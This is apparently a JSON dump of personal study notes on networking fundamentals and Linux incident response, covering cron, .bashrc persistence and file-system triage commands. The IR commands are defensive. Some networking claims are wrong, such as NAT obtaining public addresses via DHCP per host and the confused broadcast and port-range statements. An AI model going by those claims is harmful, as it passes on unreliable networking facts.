throughput is how much it is able to transfer with a time interval due to factors such as latency and data loss."},"Networking/DHCP":{"slug":"Networking/DHCP","filePath":"Networking/DHCP.md","title":"DHCP","links":["IP-address","Networking/IP-Address","Networking/IPV4-Address","Networking/Gateway","Networking/Mac-Address"],"tags":[],"content":"Dynamic Host Configuration Protocol (DHCP) is a protocol to dynamically assign IP address to a host is generally the preferred method of assigning IPv4 addresses to hosts on large networks because it reduces the burden on network support staff and virtually eliminates entry errors.\nHow DHCP works?\n1. DHCP Discover\nNew clients send DHCP broadcast when they join the network.\n2. DHCP Offer\nThe broadcast is then received by the DHCP Server and an DHCP offer is sent back to client which contains\n\nIP Address\nSubnet Mask\nDefault Gateway address\n\n3. DHCP Request\nThe client then again sends a DHCP request packet that it will accept the address.\n4. DHCP Acknowledgement\nThe server finally sends back a DHCP packet stating that the IP address assignment has been  associated with the Mac Address of the host in its table.\nDHCP Server\nDHCP Servers can be any system running DHCP service.\nWith most medium to large networks, the DHCP server is usually a local dedicated PC-based server.\nBut for home networks, the router acts as both DHCP client and a server. The router receives the public IP Address from the ISP as DHCP client, and in its role as a DHCP server, it distributes private addresses to internal hosts."},"Networking/DNS":{"slug":"Networking/DNS","filePath":"Networking/DNS.md","title":"DNS","links":[],"tags":[],"content":"abbr. Domain Name System\nManual Lookup\n&gt; nslookup google.com\nServer:  dns.google\nAddress:  8.8.8.8\n \nNon-authoritative answer:\nName:    google.com\nAddresses:  2404:6800:4002:826::200e\n          142.250.195.14"},"Networking/Ethernet-Protocol":{"slug":"Networking/Ethernet-Protocol","filePath":"Networking/Ethernet Protocol.md","title":"Ethernet Protocol","links":["Networking/OSI-Model","Networking/Mac-Address","Networking/Port"],"tags":[],"content":"Ethernet Frame\nEthernet frame are a part of Data Link Layer of OSI Model. Data to be transported between one NIC to other NIC in the same network is transported through the Ethernet Protocol.\nAn Ethernet Frame looks like:\n\nwhere,\n\nPreamble: It syncs the receiver NIC with the sender NIC bit by bit.\nSFD (abbr. Start Frame Delimiter): Indicates the start of actual of information related to ethernet frame.\nCRC (Frame Check Sequence): It makes sure that there was no error in received frame.\n\nEthernet Switch/ Layer 2 Switch\nEthernet switch is a device which connects multiple NICs together and is responsible to route ethernet frames from source NIC to destination NIC based on Layer 2 address. It checks for the receiving Mac Address in its Mac Address Table and forwards the frame to the Port linked with the Mac Address.\nWhen an ethernet switch receives an ethernet frame:\n\nIts checks if the source address is in the Mac Address table and if its not there adds it.\nThen checks if the destination address is there and\n\nIf founds forwards the frame to the respective Port.\nIf not found forwards the frame to all ports except the source Port.\nWhen the destination source sends frame back as source, the switch adds the address it its table then.\n\n\n"},"Networking/Gateway":{"slug":"Networking/Gateway","filePath":"Networking/Gateway.md","title":"Gateway","links":["Networking/DHCP","Networking/Gateway","IP-address"],"tags":[],"content":"Gateways are the “Door” in and out of a network. In home networks, the router acts as both the DHCP Server and Gateway. Default gateway address is set when configuring the IP settings either statically or dynamically using DHCP\nFor example,\nLets say we are in a network and our IP address is 192.168.5.12 and our gateway is 192.168.5.1 (the router). Similarly, in the same physical network but on different logical network is other device 192.168.6.12, then its gateway might be 192.168.6.10, even though both of them are addressing the same router; they need different Gateway addresses because they are in different logical networks."},"Networking/IP-Address":{"slug":"Networking/IP-Address","filePath":"Networking/IP Address.md","title":"IP Address","links":["Networking/IPV4-Address","Networking/IPV6-Address"],"tags":[],"content":"IP Address is logical address of a computer in a computer network. IP address are used to facilitate Network Layer/Layer3 communication.\nCurrently there exist two types of IP Addresses\n\nIPV4 Address: 192.168.1.1\nIPV6 Address: fe80::7c6:ec37:1b55:6600\n\nFollowing commands can be used to view IP address of host\n\nipconfig\n"},"Networking/IPV4-Address":{"slug":"Networking/IPV4-Address","filePath":"Networking/IPV4 Address.md","title":"IPV4 Address","links":["Networking/IPV4-Address","HTB/Services","Networking/NAT","Networking/Gateway","Networking/DHCP"],"tags":[],"content":"An IPV4 Address is used to identify each device in a network. It is a logical address of a device on a network.\n\nSubnet Mask\nThe subnet mask is used to identify the network on which the host is connected.\ne.g.,\na host with a subnet mask of 255.255.255.0 has its network address as first three octets.\nThe subnet mask for 255.255.255.0 can also be represented using slash notion or /24. This indicates that the subnet mask is 24 bits long.\n\nAddress Structure\nAn ipv4 address is 32 bits in length, and the 32 bits are grouped into four 8-bit bytes called octets like this:\n11010001.10100101.11001000.00000001\nFor ease in reading they are then converted into decimal format which we see,\n201.165.200.1\nAn ipv4 address can be divided into two portions:\n1. Network Portion\nIt is used to identify the network address of a host.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has a network address as 192.168.5.0.\nTwo different hosts on different networks can’t communicate with each other, e.g., 192.168.1.5 and 192.168.2.5 can’t communicate directly and need a router to facilitate the connection.\n2. Host Portion\nIt is used to identify a host in a network.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has the host address as 11.\n\nData Transmission\n1. Unicast\nUnicast transmission refers to one device sending a message to one other device in one-to-one communications.\nNote: A source IP address can only be a unicast address, because the packet can only originate from a single source. This is regardless of whether the destination IP address is a unicast, broadcast, or multicast.\n2. Broadcast\nBroadcast transmission refers to a device sending a message to all the devices on a network in one-to-all communications. By default, routers do not forward broadcasts to other networks.\nA broadcast packet has a destination IP address with all 32 one (1) bits.\nNote:\n\nIPv4 uses broadcast packets. However, there are no broadcast packets with IPv6.\nA router will not forward a broadcast, but a switch.\n\n3. Multicast\nMulticast transmission reduces traffic by allowing a host to send a single packet to a selected set of hosts that subscribe to a multicast group.\nA multicast packet is a packet with a destination IP address that is a multicast address. IPv4 has reserved the 224.0.0.0 to 239.255.255.255 addresses as a multicast range.\nThe multicast clients use Services requested by a client program to subscribe to the multicast group. Each multicast group is represented by a single IPv4 multicast destination address. When an IPv4 host subscribes to a multicast group, the host processes packets addressed to this multicast address, and packets addressed to its uniquely allocated unicast address.\n\nPrivate and Public IP Addresses\nPrivate IP Address\nPrivate IP address are used for communication within a network and can’t be used to communicate with internet.\nPrivate IP Address have the following network addresses:\n\n10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\n\nPublic IP Address\nPublic IP address is used to communicate on the internet and is unique worldwide.\nNote: When we connect to internet, we must convert our private address to public, and this is done by home router using Network Address Translation (NAT).\n\nLoopback addresses\nLoopback addresses (127.0.0.0 /8 or 127.0.0.1 to 127.255.255.254) are more commonly identified as only 127.0.0.1. These are special addresses used by a host to direct traffic to itself.\n\nLegacy Classful Addressing\nIn early days with a limited number of computers using the internet, classful addressing was an effective means to allocate addresses. Classful address allocation was later replaced with classless addressing, which is used today. Classless addressing ignores the rules of classes (A, B, C).\nClass A\n\n(0.0.0.0/8 to 127.0.0.0/8)\nSupports extremely large networks with more than 16 million host addresses per network. Class A used a fixed /8 prefix with the first octet to indicate the network address and the remaining three octets for host addresses.\n\nClass B\n\n(128.0.0.0 /16to 191.255.0.0 /16)\nSupports moderate to large size networks with up to approximately 65,000 hosts per network. Class B used a fixed /16 prefix with the two high-order octets to indicate the network address and the remaining two octets for host addresses.\n\nClass C\n\n(192.0.0.0 /24 to 223.255.255.0 /24)\nSupport small networks with a maximum of 254 hosts per network. Class C used a fixed /24 prefix with the first three octets to indicate the network and the remaining octet for the host addresses.\n\n\nIP Assignment Techniques\n1. Static Assignment\nWith a static assignment, the network administrator must manually configure the network information for a host. At a minimum, this includes the following:\n\nIP address: This identifies the host on the network.\nSubnet Mask: This is used to identify the network on which the host is connected.\nDefault Gateway: This identifies the networking device that the host uses to access the internet or another remote network.\n\n2. Dynamic Assignment\nRather than have the network administrator assign IPv4 addresses for each workstation, it is easier to have IPv4 addresses assigned automatically. This is done using a protocol known as Dynamic Host Configuration Protocol (DHCP).\nThe benefit of DHCP is that an address is not permanently assigned to a host but is only leased for a period of time. If the host is powered down or taken off the network, the address is returned to the pool for reuse."},"Networking/IPV6-Address":{"slug":"Networking/IPV6-Address","filePath":"Networking/IPV6 Address.md","title":"IPV6 Address","links":["Networking/IPV6-Address","Networking/IPV4-Address","Networking/NAT"],"tags":[],"content":"IPV6 Address was introduce to overcome the limitations of IPV4 Address.\nIPv6 addresses are 128 bits in length and written as a string of hexadecimal values. Every four bits are represented by a single hexadecimal digit; for a total of 32 hexadecimal values, divided into 8 parts with colon (:) every 4 digits.\ne.g., 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nFormatting Rules\n1. Omit leading Zero\nPreferred Format: 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nNo leading 0s: 2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234\n2. Double Colon\nContiguous segments of zeros can be represented by double colon (… : abcd : : efgh : …)\ne.g.,\n2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234 can be written as,\n2001 : db8 : 0 : a3 : abcd :: 1234\nNote: Double colon can only be used only once and its best practice it use it on the longest segments of zero.\nIPV6 Address &amp; IPV4 Address Coexistance\n1. Dual Stack\nBoth ipv4 and ipv6 coexist in this technology and is adopted mostly.\n2. Tunneling\nTunneling is a method of transporting an IPv6 packet over an IPv4 network. The IPv6 packet is encapsulated inside an IPv4 packet, similar to other types of data.\n3. Translation\nNetwork Address Translation 64 (NAT64) allows IPv6-enabled devices to communicate with IPv4-enabled devices using a translation technique similar to NAT for IPv4. An IPv6 packet is translated to an IPv4 packet and an IPv4 packet is translated to an IPv6 packet."},"Networking/Mac-Address":{"slug":"Networking/Mac-Address","filePath":"Networking/Mac Address.md","title":"Mac Address","links":["Networking/Ethernet-Protocol","Networking/IPV4-Address","Networking/ARP","ICMPv6-Neighbor-Discovery"],"tags":[],"content":"A MAC (Media Access Control) address is a unique identifier assigned to a network interface card (NIC) for use in communications within a network segment.\nMac address works at a lower level: Layer 2: Data Link (i.e. Ethernet Mac Address), than the IP Address which works at Layer 3: Network, hence it offers direct communication between NIC to NIC.\nWhen a Layer 3 IP packet is sent from a host, it is encapsulated within Layer 2 Ethernet Frame by NIC which is de-encapsulated by destination NIC. When a packet is sent outside the network:\n\nThe host sends Ethernet Frame with router’s mac address as destination\nThe router de-encapsulates the packet and finds optimal path to destination.\nThe IP packet is re-encapsulated with the next destination mac address\nThis process is continued for each network hop.\n\nHow are IP address associated with Mac address\nFor IPv4 packets, this is done through a process called Address Resolution Protocol (ARP). For IPv6 packets, the process is ICMPv6 Neighbor Discovery (ND)."},"Networking/NAT":{"slug":"Networking/NAT","filePath":"Networking/NAT.md","title":"NAT","links":["Networking/IP-Address","Networking/NAT","Networking/IPV4-Address","Networking/DHCP"],"tags":[],"content":"NAT abbr. Network Address Translation is the process of translating a private IP Address into public IP Address and vice versa. It is done by the router when a user tries to send a packet to a host not in the network.\nThe router keeps a table of Private IP Addresses and their Public IP Addresses, and when a packet destined to Internet is sent by a host, the router uses NAT to convert it to public address by modifying the packet and forwards to the internet.\nSimilarly, when a packet reaches the router with public IP Address the router replaces the public address with private address using its table.\nIf an associated public IP Address is present in the table, the router uses DHCP to get a public IPV4 Address for the host and then adds it to table and replaces IP and finally forwards it to the Internet."},"Networking/OSI-Model":{"slug":"Networking/OSI-Model","filePath":"Networking/OSI Model.md","title":"OSI Model","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"Abbr: Open Systems Interconnection\n\nIt has 7 layers:\n\nPhysical Layer\nDescribes the mechanical/electrical and other means to activate, maintain and deactivate physical connection to the network.\nData Link Layer\nProvides methods for exchanging data between devices in a common media\nNetwork Layer\nServices to actually exchange data between the devices.\nIP addressing occurs at this layer.\nTransport Layer\nServices to segment, transfer, and reassemble data for individual communication between devices.\nSession Layer\nProvides services for presentation layer to manage data exchange.\nPresentation Layer\nProvides representation for data transferred between Application layer.\nApplication Layer\nControls protocol for communication between the application.\n\nOSI Model and TCP IP Model both are models to transfer data in a network but have some differences. These differences are presented in TCP IP vs OSI Model."},"Networking/Port":{"slug":"Networking/Port","filePath":"Networking/Port.md","title":"Port","links":["Networking/TCP","HTB/FTP","HTB/ssh","Networking/UDP","Networking/DHCP"],"tags":[],"content":"A port is a numeric identifier within each segment that is used to keep track of specific conversations between a client and server. Ports are assigned and managed by an organization known as the Internet Corporation for Assigned Names and Numbers (ICANN). Ports are broken into three categories and range in number from 1 to 65,535:\nTypes of Ports\n1. Well-known ports\nDestination ports that are associated with common network applications are identified as well-known ports. These ports are in the range of 1 to 1023.\n2. Registered ports\nPorts 1024 through 49151 can be used as either source or destination ports. These can be used by organizations to register specific applications such as IM applications.\n3. Reserved ports\nPorts 49152 through 65535 are often used as source ports. These ports can be used by any application.\nVisual Representation\n\nSome Common Ports\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPort NumberTransportApplication Protocol20TCPFile Transfer Protocol (FTP) - Data21TCPFTP - Control22TCPSecure Shell (ssh)23TCPTelnet25TCPSimple Mail Transfer Protocol (SMTP)53UDP, TCPDomain Name Service (DNS)67UDPDynamic Host Configuration Protocol (DHCP) - Server68UDPDHCP - Client69UDPTrivial File Transfer Protocol (TFTP)80TCPHypertext Transfer Protocol (HTTP)110TCPPost Office Protocol version 3 (POP3)143TCPInternet Message Access Protocol (IMAP)161UDPSimple Network Management Protocol (SNMP)443TCPHypertext Transfer Protocol Secure (HTTPS)"},"Networking/Socket":{"slug":"Networking/Socket","filePath":"Networking/Socket.md","title":"Socket","links":["Networking/Port"],"tags":[],"content":"The combination of the source IP address and source Port number, or the destination IP address and destination Port number is known as a socket.\nSockets enable multiple processes, running on a client, to distinguish themselves from each other, and multiple connections to a server process to be distinguished from each other."},"Networking/TCP-IP-Model":{"slug":"Networking/TCP-IP-Model","filePath":"Networking/TCP IP Model.md","title":"TCP IP Model","links":["Networking/TCP","Networking/TCP-IP-Model","Networking/OSI-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"TCP/IP protocol is responsible for guaranteeing reliable delivery of a packet.\n\nTCP/IP protocol has 4 layers:\n\nApplication Layer\nRepresents data to the user, encoding and dialog control\nTransport Layer\nSupports communication between various devices across network\nInternet Layer\nDetermines best path through the network\nNetwork Access Layer\nControls the devices and media that make up the network\n\nThe difference between TCP IP Model and OSI Model are given in TCP IP vs OSI Model."},"Networking/TCP-IP-vs-OSI-Model":{"slug":"Networking/TCP-IP-vs-OSI-Model","filePath":"Networking/TCP IP vs OSI Model.md","title":"TCP IP vs OSI Model","links":[],"tags":[],"content":"While TCP/IP and OSI both are meant to standardize communication in a network, they have some key similarities and differences.\n\nTCP/IP model does not describe general functions that are necessary for all networking communications. It describes the networking functions specific to those protocols in use in the TCP/IP protocol suite\nThe protocols that make up the TCP/IP protocol suite can be described in terms of the OSI reference model. The key similarities are in the transport and network layers; however, the two models differ in how they relate to the layers above and below each layer."},"Networking/TCP":{"slug":"Networking/TCP","filePath":"Networking/TCP.md","title":"TCP","links":["Networking/Transport-Layer-Protocol","Networking/UDP"],"tags":[],"content":"Transmission Control Protocol (TCP) is a Transport Layer Protocol that is widely used to ensure reliable and ordered delivery of data over a network. Unlike UDP, TCP is a connection-oriented protocol that establishes a connection between the sender and receiver before data transmission.\nKey Features\n\nReliable Data Transfer: TCP ensures that all packets are delivered and in the correct order by using acknowledgments and retransmissions.\nConnection-Oriented: A connection is established and maintained until the data transfer is complete, ensuring that data is transmitted between the correct endpoints.\nFlow Control: TCP uses flow control mechanisms to prevent network congestion by adjusting the rate of data transmission based on the receiver’s ability to process data.\nError Detection and Correction: TCP includes mechanisms for error checking and correction to ensure data integrity.\nThree-Way Handshake: Connections are established using a three-way handshake (SYN, SYN-ACK, ACK) to synchronize the sender and receiver.\n\nApplications like web browsing, email, and file transfers use TCP because they require reliable and ordered delivery of data."},"Networking/Transport-Layer-Protocol":{"slug":"Networking/Transport-Layer-Protocol","filePath":"Networking/Transport Layer Protocol.md","title":"Transport Layer Protocol","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/UDP","Networking/TCP"],"tags":[],"content":"Transport Layer is the 4th Layer of OSI Model and 3rd Layer of TCP IP Model. It is responsible for ensuring packets are sent reliably and any missing packets are resent.\nSome of the protocols in this layer are:\n1. UDP Protocol\n2. TCP Protocol"},"Networking/UDP":{"slug":"Networking/UDP","filePath":"Networking/UDP.md","title":"UDP","links":["Networking/Transport-Layer-Protocol","Networking/TCP"],"tags":[],"content":"User Datagram Protocol (UDP) is a Transport Layer Protocol which is used transferring data over networks.\nUDP packets each have their own header and payload. The header contains information essential for routing and delivery, including source and destination ports, length, and a checksum.\nUnlike TCP, UDP does not establish a connection before transferring data and does not guarantee reliable delivery, order, or data integrity. This makes UDP faster and more efficient for applications that can tolerate packet loss, such as live broadcasts and online gaming."},"Networking/URI,-URN-and-URL":{"slug":"Networking/URI,-URN-and-URL","filePath":"Networking/URI, URN and URL.md","title":"URI, URN and URL","links":["HTB/FTP","HTB/ssh","tags/page155"],"tags":["page155"],"content":"Web resources and web services such as RESTful APIs are identified using a Uniform Resource Identifier (URI). A URI is a string of characters that identifies a specific network resource. As shown in the figure, a URI has two specializations:\n\nUniform Resource Name (URN) - This identifies only the namespace of the resource (web page, document, image, etc.) without reference to the protocol.\nUniform Resource Locator (URL) - This defines the network location of a specific resource on the network. HTTP or HTTPS URLs are typically used with web browsers. Other protocols such as FTP, SFTP, ssh, and others can be used as a URL. A URL using SFTP might look like: sftp://sftp.example.com.\n\nParts of URI\nThese are the parts of a URI, as shown in the figure:\n\nProtocol/scheme - HTTPS or other protocols such as FTP, SFTP, mailto, and NNTP\nHostname - w​ww.example.com\nPath and file name - /author/book.html\nFragment - page155\n\n"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/3-Important-Things":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/3-Important-Things","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/3 Important Things.md","title":"3 Important Things","links":[],"tags":[],"content":"When analyzing a system that has been hacked or believed to have been hacked, regardless of the processing system, there are 3 questions that must be answered. The responses to these questions may change or end the continuation of the analysis.\n\n\nIs there a malware that is actively in the system?\nIs there any suspicious internal or external communication?\nIs there any persistence?\n\nIs there a malware that is actively in the system?\nIf there is anything malicious that is actively running in the system, you may conduct a backward analysis to investigate how it came there in the first place. The easiest way to do this is conducting a process analysis. We will teach you the details of process analysis in the future. However, to give a short example: a “powershell.exe” childprocess under an “excel.exe” process is suspicious and must be investigated.\nIs there any suspicious internal or external communication?\nAn attacker must form an interaction with the server in order complete procedures like controlling the system or extracting data from it. This interaction will form network traffic. An anomaly determination can be conducted by analyzing the connections made in that system currently and in the past. For example, in the case of a connection being established with an IP with a bad reputation, or data traffic at rates of large GBs between a certain IP, or connections made between abnormal ports can be cases that should be carefully investigated.\nIs there any persistence?\nWhen the actions of the attacker until this day are observed, it can clearly be seen that the attacker aims to be permanently present in the system that has been taken over. The reason behind this can be the fact that the attacker may not have been able to complete a certain transaction quickly and may need to return to complete it later and the thought that he/she should leave an open door because he/she might need it in the future again.\nDuring your analysis, you may not be able to determine an active malicious presence or suspicious traffic. Maybe the attacker has kept a backdoor that can trigger itself once a week. Thus, you must know the procedures used for permanence and you must examine these within the system.\nAnswering the 3 mentioned questions is important. The responses to these questions may change the continuation of the analysis. To answer these questions, there are certain places you must technically analyze. We will start talking about these in the upcoming chapter."},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Bash_rc--and--Bash_profile":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Bash_rc--and--Bash_profile","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Bash_rc & Bash_profile.md","title":"Bash_rc & Bash_profile","links":[],"tags":[],"content":"In order to maintain persistence, attackers change the .bashrc and .bash_profile files for their own benefit.\nDuring the incident response procedure, all the methods that the attackers have made to maintain persistence must be identified. Any methods of persistence that are not identified will mean that the attacker can access the system again. Thus, the incident response procedure will have been unsuccessful. \nWithin the .bashrc and .bash_profile files have commands within them that will run when the shell is activated. Attackers often add reverse shell commands within these files in order to maintain permanence. \n\n\n.bashrc: executed by bash for non-login shells.\n\n\n.bash_profile: executed for login shells\n\n\nYou can see these files with the cat command or any text editor.\n\n\n\n\n\n\n\n\n\n\n\ncat .bashrc\n\nSince each user has different .bashrc and .bash_profile files, all .bashrc and .bash profile files must be identified and examined."},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Crontab":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Crontab","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Crontab.md","title":"Crontab","links":[],"tags":[],"content":"Cron is a tool for scheduling a task in UNIX operating systems. System administrators make frequent use of cron.\nThis kind of feature is of course abused by attackers to ensure persistence.\nTerms like cron, crontab and cronjob are usually mixed up. First, let’s look at the differences in these terms. \n\n\nCron: The name of the tool that ensures the timing of jobs\n\n\nCron job: Timed jobs are given the name of cron job\n\n\nCrontab: Is the configuration file that includes the cron jobs and that identifies when the cron jobs are supposed to work. \n\n\nIn short; Cron is the tool that executes the jobs (cron jobs) when they are scheduled and works with the help of the configuration file named crontab.\nUnderstanding Crontab\nBefore we start our analysis, let’s look at how a crontab file looks.\n\nThis crontab file is made up of 6 areas. These are:\n\n\nAt what minute the cron job will be executed\n\n\nAt what hour the cron job will be executed\n\n\nOn which days of the month the cron job will be executed\n\n\nWhich months the cron job will be executed\n\n\nWhich days of the week the cron job will be executed\n\n\nAnd finally, the command that will be executed\n\n\nExamples:\nIf we want a bashscript (for example /root/delete_backup.sh) to execute at the beginning of every hour, we must add a crontab like the example below.\n\nIf we want to time the job to execute on the 1st of every month, we must add a crontab like the example below.\n\nIn devices with a crontab entry like the one below, the bashscript “/root/delete_backup.sh” will execute every 15 minutes.\n\nIncident Response\nList All Cron Jobs\nSince each crontab file is different for each user, in order to identify all cron jobs, we must examine each crontab file separately. \nChecking the system crontab\nWe can first check the system crontab. Since only the authorized users can edit the system crontab, this file usually has the cron jobs that will help the system work normally. \nWith the help of the command line below, we can see the content of the crontab. \n\n\n\n\n\n\n\n\n\n\n\ncat /etc/crontab\n\nChecking The System Drop-In Directory\nThe system’s crontab files are located in the /etc/cron.d/ directory. To list all of the crontab files in this directory, you can use the command below. \n\n\n\n\n\n\n\n\n\n\n\ncat /etc/cron.d/*\n\nUser’s Crontab\nEach user has their own crontab file. To list all cron jobs by all users, you can use the command below. \n\n\n\n\n\n\n\n\n\n\n\n\n\n\ncat /var/spool/cron/crontabs/*cat /var/spool/cron/*\n\nHistorical Data\nDetecting only active cron jobs may not be sufficient to detect attacker cron job activities. In a situation where the attacker deletes the cron jobs he created because there is no need, it will not be possible to detect the activities of the attacker through active cron jobs.\nWe can list the cron executions from the syslog. With the command below, we can filter the word CRON in the logs from the syslog. \n\n\n\n\n\n\n\n\n\n\n\ncat /var/log/syslog | grep CRON\n\nWith the Journalctl tool, you can detect cron jobs running through the logs of the cron service.\n\n\n\n\n\n\n\n\n\n\n\njournalctl -u cron\n\nBy using the “—since” ve “—until” parameters with the journaltcl tool, we can list the Cron executions during the time frame of the attack. \n\n\n\n\n\n\n\n\n\n\n\njournalctl -u cron —since “2021-05-07 00:00” —until “2021-05-07 23:59”\n\nAnalyze\nAfter the cron jobs in the system are identified, we can start analyzing these cron jobs. \nFirst we need to understand when the cron job will run. Crontab files have a specific format. As we mentioned in the “Understanding Crontab” title, it is possible to schedule a cron job in various ways.\nThen the command/script to be run should be examined. Attackers often add the reverse shell command as a cron job. Such commands must be determined in the crontab.\nA good starting point for our cron job examination is to analyze the cron jobs that have been executed from suspicious locations. For example, a bash script that is being executed under a /tmp directory is suspicious. \n\nIn addition, the names and parameters of the program that will be executed must be carefully examined. The scripts with names like “backdoor”, “rev”, or “shell” must be quickly examined. \nAfter identifying the malicious cron jobs, we must check whether these cron jobs have been executed before or not. By examining the cron logs, we can identify whether these cron jobs have been executed in the past or not. \nWe can list cron logs with the commands below. \n\n\n\n\n\n\n\n\n\n\n\n\n\n\ncat /var/log/syslog | grep CRONjournalctl -u cron —since “2021-05-07 00:00” —until “2021-05-07 23:59”\nEradication\nDuring the eradication step of incident response, we must delete the cron jobs added by the attacker and revert the cron jobs that have been changed by the attacker. \nWe can conduct changes on the crontab with the command below. \n\n\n\n\n\n\n\n\n\n\n\ncrontab -e\nTo edit a crontab owned by a different user, we can use the “-u” parameter. \n\n\n\n\n\n\n\n\n\n\n\ncrontab -u USERNAME -e"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Files-and-File-System":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Files-and-File-System","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Files and File System.md","title":"Files and File System","links":[],"tags":[],"content":"In a cyber attack event, various files are written to the file system. The attacker writes the malicious software he will use, the information he collects, the programs he will use to collect information into the file system at the time of the attack. It also makes changes on the files for purposes such as increasing rights and ensuring permanence.\nAfter the incident response, the device must be restored to its former working condition. If it will not be restored via snapshot or base image, the attacker’s movements in the file system should be detected and these files should be cleaned.\nBefore moving on to our analysis, let’s take a look at the Linux File System.\n\n\n\nboot: Contains all necessary files in order for the operating system to start\n\n\nopt:  Contains the files owned by the software that have been optionally added\n\n\netc: Contains the configuration files\n\n\nbin: Contains the executable files\n\n\nsbin: Contains the files needed by the Superuser\n\n\nvar: Contains the log files\n\n\ndev: Contains device files\n\n\nhome: Contains the home files owned by users\n\n\nroot: Is the home file for the root user\n\n\nusr: Contains the application and library files\n\n\nIncident Response\nFind Suspicious Files\nSuspicious Directories\nIn order to identify the files the attacker has written into the file system, a good way to start would be to examine the commonly used directories by attackers. \nThe /tmp directory is one of the directories that must be examined during the time of the incident. The /tmp directory is a commonly used directory by attackers because it is an directory that every user has authorization to read and write. In addition, the files located in the /tmp directory are deleted after a certain amount of time. Thus, a late incident response means that we lose access to the evidence. \n\nAnother good point to start at would be to examine the directories that are open to the internet. For example, we may be able to identify the webshell files by examining the directories owned by the application for a server that serves web services. \nIn order to be able to identify directories that are open to the internet, we must initially need to identify these services. To identify the services open to the internet, we can get help from the netstat command. \nFor example, we can examine files that we believe look suspicious in the /var/www directory relating to a server that serves web services. \nSuspicious File Extensions\nWe must identify the malicious software, webshell’s, and files that are able to be run that the attacker has written into the file system. It is easier to identify these files because they have standard file extensions. \nWith the help of the find command below, we can identify the files with .sh, .php, .php7 and .elf extensions in the file system. \n\n\n\n\n\n\n\n\n\n\n\nfind / -type f ( -iname *.php -o -iname *.php7 -o -iname *.sh -o -iname *.elf )\n\nModification Time\nWe can search files within the file system based on their modification time. \nIf the time period for the cyber-attack is known, examining the modified files during this time period would make it easier to find the files that have been modified by the attacker. \nBy using the find tool, we can search for the files within the file system based on modification time.  For example, with the help of the find tool below, we can list the files below the /tmp directory that have been modified between the dates of 10/25/2021 00:00:00 and 10/25/2021 23:59:00. \n\n\n\n\n\n\n\n\n\n\n\nfind /tmp -newermt “2021-10-25 00:00:00” ! -newermt “2021-10-25 23:59:00”\n\nInstead of determining a certain time frame, we can also filter by modification date prior to X or after X. \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfind / -mtime +Xfind / -mtime -X\nOwner\nWhile searching suspicious files, if we know the compromised users, conducting an analysis on files owned by compromised users may help you get quick results. \nIt is impossible to identify files modified by X user. However, we can identify files owned by X user. \nBy use of the find tool, we can identify all of the files owned by a certain user. For example, with the help of the command below, the files owned by the www-data user is listed under the /tmp directory. \n\n\n\n\n\n\n\n\n\n\n\nfind /tmp -user www-data\n\nChange Date\nWhen the ownership of a file, the directories in a file or the content of a file is changed by the attacker, the Change Date of the file changes. For various reasons, the attacker may change the authorizations and ownership of the file. \nWith the help of the find command, we can search based on change date. \n\n\n\n\n\n\n\n\n\n\n\nfind / -ctime +X\nAnalyze\nWhen the suspicious files are identified, now these files must be analyzed. \nBefore putting the file into a static or dynamic analysis, we must first get more information about the file.\nBy use of the stat tool, we can get detailed information about the file. \n\n\n\n\n\n\n\n\n\n\n\nstat FILENAME\n\nAfter getting information about the file, we can move on to static analysis, dynamic analysis and code analysis.\n Remediation\nIn the remediation step of incident response, the modifications the attacker has made to the file system must be reverted to its normal state. The files that the attacker has written into the file system must be deleted and the files the attacker has modified must be reverted to its normal state. \nIf possible, it is healthier to revert the system with a clean image or a snapshot that was taken before the cyber-attack."},"SOC/Cysa+-Prep/Incident-Response-on-Linux/How-to-Create-Incident-Response-Plan":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/How-to-Create-Incident-Response-Plan","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/How to Create Incident Response Plan.md","title":"How to Create Incident Response Plan","links":[],"tags":[],"content":"What is incident response?\nIncident response is an approach to managing a security incident process. An incident response plan is needed to approach security incidents systematically. A successful incident response plan includes the following 6 stages:\n1- Preparation\n2- Identification\n3- Scope\n4- Eradication\n5- Recovery\n6- Lessons Learned\n1- Preparation\nCreating a Central Registration System\nIt is important in terms of saving time that all data can be examined from a single point with a central log collection system that can manage large files.\nTime Synchronization\nEnabling NTP on all devices in the network is important for matching the time information of the logs collected.\nUser Account Management\nThe fact that the user names of different accounts belonging to personnel are the same and different from other personnel makes it easy to monitor user activities in the event of an incident.\nManagement of System and Service Accounts\nThe administrators of the services and systems used should be appointed and a document should be created on how to reach these managers if needed.\nAsset Management\nInstant access to information such as devices, operating systems, patch versions, and critical status should be available.\nSecure Communication\nIf necessary, the team may need to communicate independently of the internal network, for such cases mobile phone or secondary emails can be used.\nLegal Transactions\nThe method of who will initiate the judicial process and in which situations should be determined before the incident occurs.\n2- Identification\nReview\nFor a potential suspicious incident, preliminary information about the incident should be gathered. Then it 